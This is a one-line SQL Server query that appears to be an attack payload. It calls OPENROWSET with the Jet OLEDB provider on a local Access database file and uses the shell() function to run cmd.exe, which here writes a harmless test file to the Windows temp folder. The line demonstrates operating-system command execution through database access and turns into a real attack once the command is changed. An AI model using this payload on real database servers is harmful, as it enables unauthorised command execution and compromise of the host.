select * from openrowset('microsoft.jet.oledb.4.0',';database=C:\Windows\System32\LogFiles\Sum\Current.mdb','select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')
